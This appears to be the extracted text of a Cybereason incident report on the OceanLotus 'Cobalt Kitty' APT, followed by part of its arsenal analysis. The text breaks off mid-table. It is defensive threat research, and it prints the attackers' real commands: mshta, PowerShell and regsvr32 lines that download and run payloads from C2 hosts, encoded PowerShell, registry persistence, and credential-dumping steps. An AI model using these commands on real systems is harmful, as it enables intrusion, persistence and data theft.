@@ -1,0 +1,2995 @@
+©2016 Cybereason. All rights reserved. 
+1
+Operation Cobalt Kitty
+Cybereason Labs Analysis
+By: Assaf Dahan
+©2016 Cybereason. All rights reserved. 
+1
+Operation Cobalt Kitty
+Attack Lifecycle
+By: Assaf Dahan
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+1 
+ 
+Table of Contents 
+Detailed attack lifecycle 
+Penetration phase 
+Fake Flash Installer delivering Cobalt Strike Beacon 
+Word File with malicious macro delivering Cobalt Strike Beacon 
+Post infection execution of scheduled task 
+Establishing foothold 
+Windows Registry 
+Windows Services 
+Scheduled Tasks 
+Outlook Persistence 
+C2 Communication 
+Cobalt Strike Fileless Infrastructure (HTTP) 
+C&C payloads 
+Cobalt strike Malleable C2 communication patterns 
+Variant of Denis Backdoor using DNS Tunneling 
+Outlook Backdoor Macro as C2 channel 
+Custom NetCat 
+Internal reconnaissance 
+Internal Network Scanning 
+Information gathering commands 
+Vulnerability Scanning using PowerSploit 
+Lateral movement 
+Obtaining credentials 
+Mimikatz 
+Gaining Outlook credentials 
+Pass-the-hash and pass-the-ticket 
+Propagation via Windows Admin Shares 
+Windows Management Instrumentation (WMI) 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+2 
+ 
+ 
+Detailed attack lifecycle  
+ 
+The advanced persistent threat Operation Cobalt Kitty targeted a global corporation and was 
+carried out by highly skilled and very determined adversaries. This report provides a 
+comprehensive, step-by-step technical account of how the APT was carried out by the 
+OceanLotus Group, diving into their work methods throughout APT lifecycle.  Like other 
+reported APTs, this attack “follows” the stages of a classic attack lifecycle (aka cyber kill-chain), 
+which consists of these phases:  
+ 
+1. Penetration 
+2. Foothold and persistence 
+3. Command & control and data exfiltration 
+4. Internal reconnaissance 
+5. Lateral movement 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+3 
+ 
+ 
+1. 
+Penetration phase 
+The penetration vector in this attack was social engineering, specifically spear-phishing attacks 
+against carefully selected, high-profile targets in the company. Two types payloads were found 
+in the spear-phishing emails:   
+ 
+1. Link to a malicious site that downloads a fake Flash Installer delivering Cobalt Strike 
+Beacon 
+2. Word documents with malicious macros downloading Cobalt Strike payloads 
+ 
+Fake Flash Installer delivering Cobalt Strike Beacon 
+The victims received a spear-phishing email using a pretext of applying to a position with the 
+company. The email contained a link to a redirector site that led to a download link, containing a 
+fake Flash installer. The fake Flash installer launches a multi-stage fileless infection process.  
+This technique of infecting a target with an fake Flash installer is consistent with the OceanLotus 
+Group and has been documented in the past.  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+4 
+ 
+ 
+ 
+ 
+Download Cobalt Strike payload - The fake Flash installer downloads an encrypted payload 
+with shellcode from the following URL: hxxp://110.10.179(.)65:80/ptF2 
+ 
+ 
+Word File with malicious macro delivering Cobalt Strike Beacon 
+Other types of spear-phishing emails contained Microsoft Office Word attachments with different 
+file names, such as CV.doc and Complaint_Letter.doc. 
+  
+ 
+ 
+ 
+The malicious macro creates two scheduled tasks that download files camouflaged as “.jpg” 
+files from the C&C server:  
+ 
+Scheduled task 1: 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+5 
+ 
+ 
+ 
+Scheduled task 2:  
+ 
+ 
+ 
+The two scheduled tasks are created on infected Windows machines: 
+ 
+ 
+Post infection execution of scheduled task 
+Example 1: Fileless downloader delivers Cobalt Strike Beacon 
+The purpose of the scheduled task is to download another payload from the C&C 
+server:  
+schtasks /create /sc MINUTE /tn "Windows Error Reporting" /tr "mshta.exe about:'<script 
+language=\"vbscript\" src=\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\">code close</script>'" 
+/mo 15 /F 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+6 
+ 
+ 
+The content of the “microsoftp.jpg” is a script  that combines vbscript and PowerShell: 
+SHA-1: 23EF081AF79E92C1FBA8B5E622025B821981C145 
+ 
+ 
+That downloads and executes an additional payload from the same server with a slightly 
+different name “microsoft.jpg”. 
+ 
+Obfuscated PowerShell delivering Cobalt Strike Beacon - The contents of the 
+“microsoft.jpg” file is, in fact, an obfuscated PowerShell payload (obfuscated with Daniel 
+Bohannon’s Invoke-obfuscation). 
+ 
+microsoft.jpg, SHA-1: C845F3AF0A2B7E034CE43658276AF3B3E402EB7B 
+ 
+ 
+Quick memory analysis of the payload reveals that it is a Cobalt Strike Beacon, as seen in the 
+strings found in the memory of the PowerShell process:  
+ 
+ 
+ 
+Example 2: Additional Cobalt Strike delivery method 
+ 
+Cybereason observed another method of Cobalt Strike Beacon delivery  in infected machines.  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+7 
+ 
+ 
+Once the initial PowerShell payload is downloaded from the server, it will pass an obfuscated 
+and XOR’ed PowerShell payload to cmd.exe:  
+ 
+ 
+ 
+The payload is decrypted to the following PowerShell downloader one-liner:  
+IEX ((new-object net.webclient).downloadstring(‘hxxp://27.102.70(.)211:80/image.jpg')) 
+ 
+The PowerShell process will then download the new ‘image.jpg’ payload, which is actually 
+another obfuscated PowerShell payload:   
+image.jpg - 9394B5EF0B8216528CED1FEE589F3ED0E88C7155 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+8 
+ 
+ 
+ 
+Once executed by PowerShell, the embedded script was identified as Cobalt Strike Beacon:  
+ 
+ 
+ 
+2. 
+Establishing foothold 
+Gaining persistence is one of the attack’s most important phases. It insures that the malicious 
+code will run automatically and survive machine reboots.  
+ 
+The attackers used trivial but effective persistence techniques to ensure that their malicious 
+tools executed constantly on the infected machines. Those techniques consist of: 
+● Windows Registry Autorun 
+● Windows Services 
+● Windows Scheduled Tasks  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+9 
+ 
+ 
+2.1. 
+Windows Registry 
+The attackers used the Windows Registry Autorun to execute VBScript and PowerShell scripts 
+residing in the ProgramData folder, which is hidden by default:  
+ 
+HKU\[redacted]\Software\Microsoft\Windows\CurrentVersion\Run\Java Update Schedule Check 
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\syscheck  
+HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\DHCP Agent  
+HKU\[redacted]\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activation Checker  
+HKU\[redacted]\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Update  
+ 
+Examples of the values of the above registry keys:  
+ 
+ 
+The purpose of those .vbs scripts was to launch Cobalt Strike PowerShell scripts mainly 
+consisting of Cobalt Strike Beacon. Some of the files found in ProgramData appear to be .txt 
+files. However, their content is VBscript.   
+ 
+In addition, the attackers used NTFS Alternate Data Stream to hide their payloads. This is a 
+rather old trick to hide data from the unsuspecting users and security solutions. 
+ 
+The code inside the ‘hidden’ .txt file launches a PowerShell process with a base64-encoded 
+command:  
+ 
+ 
+This PowerShell commands decodes to:  
+Invoke-Expression C:\ProgramData\Microsoft\SndVolSSO.ps1 
+ 
+This launches a PowerShell script, which loads an obfuscated and encoded Cobalt Strike’s 
+beacon payload:  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+10 
+ 
+ 
+ 
+ 
+2.2. 
+Windows Services 
+The attackers created and/or modified Windows Services to ensure the loading of the 
+PowerShell scripts on the compromised machines. These scripts are mostly PowerShell-
+encoded Cobalt Strike’s Beacon payloads:   
+ 
+ 
+ 
+Backdoor exploits DLL hijacking against Wsearch Service 
+ 
+According to Microsoft’s documentation, Windows Search Service (Wsearch), which is a default 
+component in Windows OS, runs automatically. Once Wsearch starts, it launches 
+SearchIndexer.exe and SearchProtocolHost.exe applications. These applications are vulnerable 
+to “Phantom DLL Hijacking” and were exploited in other targeted attacks.  
+ 
+The attackers placed a fake “msfte.dll” under the system32 folder, where the vulnerable 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+11 
+ 
+applications reside by default. This ensured that the fake “msfte.dll” would be loaded each time 
+Wsearch launched these applications: 
+ 
+ 
+ 
+For further details about the backdoor, please refer to Cobalt Kitty Attacker’s Arsenal: Deep dive 
+into the tools used in the APT. 
+ 
+2.3. 
+Scheduled Tasks 
+The attackers used scheduled tasks to ensure the malicious payloads ran in predetermined 
+timeframes: 
+ 
+PowerShell Loader:  
+ 
+ 
+Google Update:  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+12 
+ 
+The attackers exploited a DLL hijacking vulnerability in a legitimate Google Update binary, 
+which was deployed along with a malicious DLL (goopdate.dll). By default, GoogleUpdate.exe 
+creates a scheduled task that checks if a new version of Google products is available.  
+ 
+As a result, each time GoogleUpdate.exe application ran, it automatically loaded the malicious 
+goopdate.dll: 
+ 
+ 
+For further details about the backdoor, please refer to Cobalt Kitty Attacker’s Arsenal: Deep dive 
+into the tools used in the APT. 
+ 
+2.4. 
+Outlook Persistence 
+The attackers used a malicious Outlook backdoor macro to communicate with the C2 servers 
+and exfiltrate data. To make sure the malicious macro ran, they edited a specific registry value 
+to create persistence: 
+ 
+/u /c REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Office\14\Outlook" /v 
+"LoadMacroProviderOnBoot" /f /t REG_DWORD /d 1 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+13 
+ 
+ 
+ 
+3. 
+C2 Communication  
+The attackers used different techniques and protocols to communicate with the C&C servers:  
+ 
+3.1. 
+Cobalt Strike Fileless Infrastructure (HTTP) 
+The attackers chose to implement a multi-stage payload delivery infrastructure in the first phase 
+of the attack. The motivation for fileless operation is clear: this approach has a low forensic 
+footprint since most of the payloads are downloaded from the C&C and executed in-memory 
+without touching the disk.  
+ 
+Multi-Stage Payload Delivery 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+14 
+ 
+PowerShell downloader 
+A PowerShell one-liner downloads and executes a PowerShell payload from the C&C server. 
+ 
+ 
+Regsvr32.exe downloader command (COM Scriptlet) 
+The fileless infrastructure also used another type of downloader, which is based on COM 
+scriptlets (.sct). This technique is well documented and has been used extensively in the last 
+year.  
+ 
+The attackers downloaded COM scriptlets using regsvr32.exe: 
+regsvr32 /s /n /u /i:hxxp://support.chatconnecting(.)com:80/pic.png scrobj.dll 
+ 
+C&C payloads 
+Following are a few examples of C&C payloads used as part of the fileless payload delivery 
+infrastructure.  
+ 
+Example 1: Second Stage PowerShell Script 
+This .txt file is actually a base64-encoded PowerShell payload that contains a shellcode: 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+15 
+ 
+ 
+ 
+File Name: login.txt, SHA-1: 9f95b81372eaf722a705d1f94a2632aad5b5c180 
+ 
+The shellcode downloads additional payload from the URL: hxxp://food(.)letsmiles(.)org/9niL 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+16 
+ 
+ 
+Example 2: Second Stage COM Scriptlet Payload 
+The regsvr32.exe downloader command downloads the following COM scriptlet, which contains 
+an embedded shellcode:  
+ 
+ 
+ 
+File Name: pic.png,  SHA-1: f3e27ad08622060fa7a3cc1c7ea83a7885560899 
+ 
+The shellcode downloads a payload from the following URL:  
+hxxp://45(.)114.117.137/eXYF  
+ 
+Final payload: Cobalt Strike Beacon 
+Analysis of the final stage payloads (such as “9niL” / “eXYF”)  clearly shows that they are Cobalt 
+Strike Beacons:  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+17 
+ 
+ 
+ 
+ 
+ 
+3.2. 
+Cobalt strike Malleable C2 communication 
+patterns 
+Another confirmation that the attackers used Cobalt Strike’s infrastructure came from the 
+analysis of the network traffic. The analyzed traffic matched Cobalt Strike’s Malleable C2. 
+The attackers used the Amazon, Google Safe Browsing, Pandora and OSCP profiles in this 
+attack, all of which are publicly available in Github:  
+https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/safebrowsing.profile 
+https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile 
+https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/pandora.profile 
+https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/oscp.profile 
+ 
+A .pcap file that was recorded during the execution of the Cobalt Strike payloads clearly shows 
+the usage of the Malleable C2 profiles, in that case - the “safebrowsing.profile”: 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+18 
+ 
+Another example is the Amazon profile, generated by another Cobalt Strike payload:  
+ 
+ 
+3.3. 
+Variant of Denis Backdoor using DNS Tunneling 
+During the investigation, an analysis of the backdoor’s traffic revealed that the attackers 
+implemented DNS tunneling channel for C2 communication and data exfiltration. The DNS 
+tunneling channel was observed being used by the PowerShell payloads as well as the fake 
+DLLs (msfte.dll and goopdate.dll). In attempt to disguise the real IP/domain of the C&C server, 
+the backdoor communicates with the following DNS servers instead of communicating directly 
+with the C&C servers:  
+Google DNS server: 8.8.8.8 
+OpenDNS server: 208.67.222.222 
+ 
+By communicating with known DNS servers, the attackers ensured that the backdoor’s traffic 
+will not be filtered by firewalls and other security products since it’s unlikely for most 
+organizations to block OpenDNS and Google’s DNS servers.  
+ 
+Example of DNS tunneling can be seen in this instance of ARP.exe that was spawned by 
+searchindexer.exe, which loaded the fake msfte.dll:  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+19 
+ 
+  
+ 
+ 
+Upon inspection of the DNS traffic, the real C&C domain is revealed inside the DNS queries: 
+Real C&C domain: z.teriava(.)com 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+20 
+ 
+3.4. 
+Outlook Backdoor Macro as C2 channel 
+ 
+During the third phase of the attack, the attackers used an advanced technique that turned 
+Microsoft Outlook into a C2 channel by replacing the email program’s original VbaProject.OTM 
+macro container with a malicious one containing a backdoor functionality. Using this backdoor, 
+the attackers managed to send system commands via emails from a Gmail address and 
+exfiltrate data.   
+ 
+The decoded malicious macro is loaded after boot and constantly looks for incoming emails 
+containing the strings $$cpte and $$ecpte. 
+ 
+ 
+The attacker’s command embed their commands between those two strings.  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+21 
+ 
+The same technique was used to steal and exfiltrate sensitive company data, as seen in the 
+screenshots below: 
+ 
+Outlook spawns two cmd.exe shells:  
+ 
+ 
+The command lines of the following cmd.exe instances clearly show that the attackers were 
+gathering information and exfiltrating specific documents:  
+ 
+cmd.exe /C “ ipconfig > %temp%.log.txt 
+cmd.exe /C “ c:\Users\[redacted]\Desktop\[Redacted_File_name].xls %temp%” 
+ 
+3.5. 
+ Custom NetCat 
+Another C2 communication tool used by the attackers was a custom version of the famous 
+Netcat tool (aka, tcp/ip Swiss Army knife) from GitHub. Using the previously installed backdoor, 
+the attackers uploaded and executed this customized version of NetCat on several machines:  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+22 
+ 
+ 
+ 
+The NetCat binary was renamed “kb-10233.exe”, masquerading as a Windows update, in order 
+to look less suspicious. The sample’s SHA-1 hash is: 
+c5e19c02a9a1362c67ea87c1e049ce9056425788,  
+which is the exact match to the customized version of Netcat found on Github.   
+ 
+In addition, examining the command line arguments reveals that the attackers also were aware 
+of the proxy server deployed in the environment and configured the IP and port accordingly to 
+allow them external connection to the C&C server:  
+ 
+ 
+ 
+4. 
+Internal reconnaissance 
+After the attackers established a foothold on the compromised machines and established C2 
+communication, they scanned the network, enumerated machines and users and gathered more 
+information about the environment.  
+ 
+4.1. 
+Internal Network Scanning 
+During the attack, Cybereason observed network scanning against entire ranges as well as 
+specific machines. The attackers were looking for open ports, services, OS finger-printing and 
+common vulnerabilities:  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+23 
+ 
+ 
+Cybereason detected the following PowerShell instance with an Base64 encoded command:  
+powershell -nop -exec bypass -EncodedCommand 
+"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbA
+BpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB
+0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADQANwA5ADIALwAnACkAOwAg
+AFMAYwBhAG4AIAAxADkAMgAuADEANgA4AC4AOAAuADAALQAyADUANAAgAC0AbwBzA
+CAALQBzAGMAYQBuAHAAbwByAHQAIAAgACAAIAAgACAAIAAgACAAIAAgAA==" 
+ 
+Decoded Base64 PowerShell command:  
+IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:24792/'); Scan 192.168.x.x-
+254 -os –scanport 
+ 
+As the screenshot below shows, the attackers launched port scanning against common ports:  
+ 
+ 
+ 
+4.2. 
+Information gathering commands 
+The attackers used several tools built into the Windows OS to gather information on the 
+environment’s network and its users. Those tools included  netsh, ipconfig, netstat, arp, net 
+user/group/localgroup, nslookup and Windows Management Instrumentation (WMI). 
+ 
+The following are a few examples of command line arguments that were used to gather 
+information on the infected hosts and the network:  
+Command 
+Purpose 
+net localgroup administrators 
+Enumerating admin users 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+24 
+ 
+net group "Domain Controllers" /domain 
+Enumerating DC servers 
+klist tickets 
+Displaying Kerberos Tickets 
+dir \\[IP_redacted]\c$ 
+Displaying files on net share 
+netstat -anpo tcp 
+Displaying TCP connections 
+ipconfig /all 
+Displaying Network adapter information 
+ping [hostname_redacted] -n 1 
+Pinging a host 
+net view \\[redacted] /all 
+Shows all shares available, including 
+administrative shares like C$ and admin$ 
+netsh wlan show interface 
+Displaying Wireless adapter properties 
+route print 
+Displaying a list of persistent routes 
+WHOAMI 
+Outputs the owner of the current login session 
+(local, admin, system) 
+WMIC path win32_process get 
+Caption,Processid,Commandline | findstr 
+OUTLOOK 
+Searching for the process ID of OUTLOOK, in 
+order to restart it, so it would load the 
+malicious vbaproject.otm file 
+ 
+4.3. 
+Vulnerability Scanning using PowerSploit 
+ 
+ 
+Once the Cobalt Strike Beacon was installed, the attackers attempted to find privilege escalation 
+vulnerabilities that they could exploit on the compromised hosts. The following example shows a 
+command that was run by a spawned PowerShell process:  
+ 
+powershell -nop -exec bypass -EncodedCommand 
+"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAb
+gB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AM
+QAyADcALgAwAC4AMAAuADEAOgAyADUAMwA4AC8AJwApADsAIABJAG4AdgBvAGsAZQAtAEEAbA
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+25 
+ 
+BsAEMAaABlAGMAawBzAA==" 
+ 
+The encoded command decodes to -  
+IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:2538/'); Invoke-AllChecks 
+ 
+The Invoke-AllChecks command is indicative to the PowerUp privilege escalation “scanner”, 
+which is part of the PowerSploit project.  
+ 
+5. 
+Lateral movement 
+The attackers compromised more than 35 machines, including the Active Directory server, by 
+using common lateral movement techniques including pass-the-hash and pass-the-ticket and 
+Windows applications such as net.exe and WMI.  
+ 
+5.1. 
+Obtaining credentials 
+Before the attackers could spread to new machines, they had to obtain the necessary 
+credentials, such as passwords, NTLM hashes and Kerberos tickets. To obtain these 
+credentials, the attackers used various, known tools to dump locally stored credentials.  
+ 
+The attackers mainly used Mimikatz, which was customized in a way that ensured antivirus 
+products wouldn’t detect it.  
+ 
+Other tools used to obtain credentials included:  
+● Modified Window’s Vault Password Dumper - A PowerShell version of a known 
+password dumping tool, which was modified in order to accommodate additional 
+functionality and to evade antivirus.  
+●  Hook Password Change  - Modified version of the a tool found on Github. This tool 
+alerts the attackers if passwords are changed by hooking specific functions in the 
+Windows OS. This provided the attackers a workaround to the frequent password resets 
+ordered by the IT department during the attack.  
+ 
+5.1.1. Mimikatz 
+The main tool used to obtain credentials from the compromised machines was a obfuscated and 
+sometimes slightly modified versions of Mimikatz, a known password dumping tool, whose 
+source code is freely available on GitHub. The attackers used at least 14 different versions of 
+Mimikatz using different techniques to evade antivirus detection:  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+26 
+ 
+ 
+ 
+The following screenshot shows examples of the command line arguments indicative of 
+Mimikatz that were that were used in the attack: 
+ 
+ 
+ 
+5.1.2. Gaining Outlook credentials 
+In addition to Windows account credentials, the attackers also targeted the Outlook credentials 
+of selected high-profile employees. The attackers modified a known password dumper in order 
+to make it more Outlook-oriented. The binary version of this tool is detected by most antivirus 
+vendors so the attackers ported it to PowerShell, making it stealthier. However, in order to use 
+the PowerShell version, the attackers had to overcome measures that were put in place to 
+restrict PowerShell execution. 
+ 
+The attackers used a modified version of a publicly available tool called PSUnlock to bypass the 
+PowerShell execution restrictions. Here’s an example of this tool being used: 
+rundll32 C:\ProgramData\PShdll35.dll,main -f C:\ProgramData\doutlook.ps1 
+ 
+The purpose of the doutlook.ps1 (SHA-1: ebdd6059da1abd97e03d37ba001bad4aa6bcbabd) 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+27 
+ 
+script becomes very clear when observing the memory strings of the Rundll32.exe process:    
+ 
+ 
+5.2. 
+Pass-the-hash and pass-the-ticket 
+Cybereason detected multiple lateral movement techniques that were used during the attack. 
+The attackers successfully carried out pass-the-hash and pass-the-ticket attacks using stolen 
+NTLM hashes and Kerberos tickets from compromised machines.  
+ 
+The attackers managed to compromise a domain admin account. Using the compromised 
+administrative account, the attackers moved laterally, deployed their tools and mass-infected 
+other machines. More instances of lateral movements were observed using other compromised 
+accounts during the different stages of the attack.  
+ 
+Example 1: Deploying Mimikatz on remote machines 
+The attackers deployed a customized Mimikatz using stolen credentials from an administrative 
+account, which they used to carry out a pass-the-hash attack:  
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+28 
+ 
+ 
+ 
+Example 2: Gaining remote access using pass-the-ticket attack  
+ 
+ 
+ 
+5.3. 
+Propagation via Windows Admin Shares 
+Another lateral movement technique that was used extensively in the attack involved using the 
+Windows Admin Shares via the built-in Windows “net.exe” tool. This technique uses Windows’ 
+hidden network shares, which administrators can only access and use to copy their tools to 
+remote machines and execute them.  
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+29 
+ 
+The screenshot below show an example of this technique being used in the attack:  
+ 
+ 
+ 
+ 
+5.4. 
+ Windows Management Instrumentation (WMI) 
+The attackers used a well-documented lateral movement technique that abuses Windows 
+Management Instrumentation (WMI) and “Net User” commands to deploy their tools on remote 
+machines. 
+ 
+Example: Infecting other machines with Denis backdoor 
+Using WMI and the stolen credentials, the attackers copied the backdoor DLL (msfte.dll) to the 
+target machine:  
+ 
+ 
+ 
+To ensure that the fake msfte.dll will be loaded by SearchIndexer.exe / SearchProtocolHost.exe 
+processes, the attackers had to restart the Wsearch service.  
+ 
+Stopping the Wsearch service 
+ 
+ 
+Starting the Wsearch service 
+ 
+ 
+ 
+ 
+©2017 Cybereason Inc. All rights reserved. 
+ 
+30 
+ 
+ 
+Once the service is started again, the malicious msfte.dll will be loaded by the 
+searchindexer.exe application:  
+ 
+ 
+©2016 Cybereason. All rights reserved. 
+1
+Operation Cobalt Kitty
+Attackers' Arsenal
+By: Assaf Dahan
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+1 
+Table of Contents 
+Introduction 
+Meet Denis the Menace: The APT’s main backdoor 
+Description 
+3-in-1: Phantom DLL hijacking targeting Microsoft’s Wsearch 
+Functionality 
+Static analysis 
+Dynamic analysis 
+Variation in process injection routines 
+The backdoor code 
+C2 communication 
+Second backdoor: “Goopy” 
+Analysis of Goopy 
+DLL side loading against legitimate applications 
+Outlook backdoor macro 
+Cobalt Strike 
+COM Scriptlets (.sct payloads) 
+Obfuscation and evasion 
+Don’t-Kill-My-Cat 
+Invoke-obfuscation (PowerShell Obfuscator) 
+PowerShell bypass tool (PSUnlock) 
+Credential dumpers 
+Mimikatz 
+GetPassword_x64 
+Custom “HookPasswordChange” 
+Custom Outlook credential dumper 
+Custom Windows credential dumper 
+Modified NetCat 
+Custom IP check tool 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+2 
+Introduction 
+During the investigation, Cybereason recovered over 80 payloads that were used during the 
+four stages of the attack. Such a large number of payloads is quite unusual and further 
+demonstrates the attackers’ motivation to stay under the radar and avoid using the same 
+payloads on compromised machines. At the time of the attack, only two payloads had file 
+hashes known to threat intelligence engines, such as VirusTotal.  
+ 
+This arsenal is consistent with previous documentations of the OceanLotus Group. But it also 
+includes new custom tools that were not publicly documented in APTs carried out either by 
+the OceanLotus Group or by threat actors.  
+ 
+The payloads can be broken down into three groups:  
+ 
+Payload type 
+Total 
+number 
+Main payloads 
+Previously 
+reported being 
+used by 
+OceanLotus? 
+Binary files 
+(.exe and .dll 
+files) 
+ 
+ 
+ 
+**found on 
+compromised 
+machines 
+46 
+● 
+Variant of the Denis Backdoor (msfte.dll) 
+● 
+Goopy Backdoor (goopdate.dll) 
+● 
+Cobalt Strike's Beacon 
+● 
+Mimikatz 
+● 
+GetPassword_x64 
+● 
+PSUnlock 
+● 
+NetCat 
+● 
+HookPasswordChange 
+● 
+Custom Windows Credential  Dumper 
+● 
+Custom IP tool 
+No** 
+No** 
+Yes 
+Yes 
+No 
+No 
+No 
+No 
+No 
+No 
+Scripts  
+(PowerShell + 
+VBS) 
+ 
+**found on 
+compromised 
+machines 
+24 
+● 
+Backdoor - PowerShell version 
+● 
+Outlook Backdoor (Macro) 
+● 
+Cobalt Strike Downloaders / Loaders / 
+Stagers 
+● 
+Cobalt Strike Beacon 
+● 
+Custom Windows Credential Dumper 
+● 
+Custom Outlook Credential Dumper 
+● 
+Mimikatz 
+● 
+Invoke-Obfuscation (PowerShell Obfuscator) 
+● 
+Don’t-Kill-My-Cat (Evasion/Obfuscation Too) 
+No** 
+No** 
+Yes 
+ 
+Yes 
+No 
+No 
+Yes 
+Yes 
+Yes 
+C&C 
+Payloads 
+18 
+● 
+Cobalt Strike Downloaders / Stagers 
+● 
+Cobalt Strike Beacon 
+● 
+COM  scriptlets (downloaders) 
+Yes 
+Yes 
+Yes 
+** OceanLotus is said to use tools with similar capabilities, however, no public documentation is available to 
+determine whether the tools are the same.  
+ 
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+3 
+Meet Denis the Menace: The APT’s main backdoor 
+ 
+Description  
+The main backdoor was introduced by the attackers during the second stage of the attack, after 
+their PowerShell infrastructure was detected and shut down. Cybereason spotted the main 
+backdoor in in December 2016:  
+  
+ 
+This backdoor was dubbed “Backdoor.Win32.Denis” by Kaspersky, which published their 
+analysis of it in March 2017. However, quite possibly, the is evidence of this backdoor being 
+used “in-the-wild”  back in August 2016. At the time of the attack, the backdoor was not 
+previously known or publicly analyzed in the security community. The backdoor used in the 
+attack is quite different from the samples analyzed by Kaspersky and other samples caught “in-
+the-wild”:  
+ 
+ 
+ 
+ 
+ 
+ 
+Cobalt Kitty “Denis” Variants 
+Backdoor.Win32.Denis 
+File Type 
+.dll + .ps1 
+.exe  
+ 
+©2017 Cybereason Inc. All rights reserved.  
+ 
+ 
+ 
+ 
+ 
+ 
+4 
+Vessel 
+Legitimate  applications vulnerable to 
+DLL hijacking / PowerShell 
+Standalone executables 
+Loader and 
+Process 
+Injection 
+Loader decrypts the backdoor payload 
+and injects to host processes:  
+rundll32.exe / svchost.exe / arp.exe / 
+PowerShell.exe 
+No injection to host 
+processes documented 
+Anti analysis 
+tricks 
+ 
+More sophisticated anti-debugging anti-
+emulation tricks were put to hinder 
+analysis 
+Anti-analysis tricks exist, 
+however, fewer and simpler 
+ 
+In terms of the backdoor’s features, it has similarities to the backdoor (SOUNDBITE), described 
+in FireEye’s report about APT32 (OceanLotus). However, FireEye’s analysis of this backdoor is 
+not publicly available. Therefore, Cybereason cannot fully determine whether SOUNDBITE 
+and Denis are the same backdoor, even though the likelihood seems rather high.  
+ 
+The backdoor’s main purpose was to provide the attackers with a “safe” and stealthy channel to 
+carry out post-exploitation operations, such as information gathering, reconnaissance, 
+lateral movement and data collection (stealing proprietary information). The backdoor uses 
+DNS Tunneling as the main C2 channel between the attackers and the compromised hosts. 
+The backdoor was mainly exploiting a rare “phantom DLL hijacking” against legitimate 
+Windows Search applications. The attacker also used a PowerShell version of the backdoor on 
+a few machines. However, the majority came in a DLL format.  
+ 
+Most importantly, the analysis of the backdoor binaries strongly suggests that the binaries used 
+in the attack were custom made and differ from other binaries caught in the wild. The binaries 
+were generated using a highly-sophisticated PE modification engine, which shows the threat 
+actor’s high level of sophistication. 
+ 
+Four variants of the main backdoor were found in the environment:  
+ 
+File name 
+Variation type 
+SHA-1 hash 
+msfte.dll 
+Injected host process:  
+svchost.exe 
+638B7B0536217C8923E856F4138D9CA
+FF7EB309D 
+msfte.dll 
+Injected host process: 
+rundll32.exe 
+BE6342FC2F33D8380E0EE5531592E9F
+676BB1F94 
+msfte.dll 
+Injects host process:  
+arp.exe 
+43B85C5387AAFB91AEA599782622EB9
+D0B5B151F 
+PowerShell #1: 
+Sunjavascheduler.ps1 
+SndVolSSO.ps1 
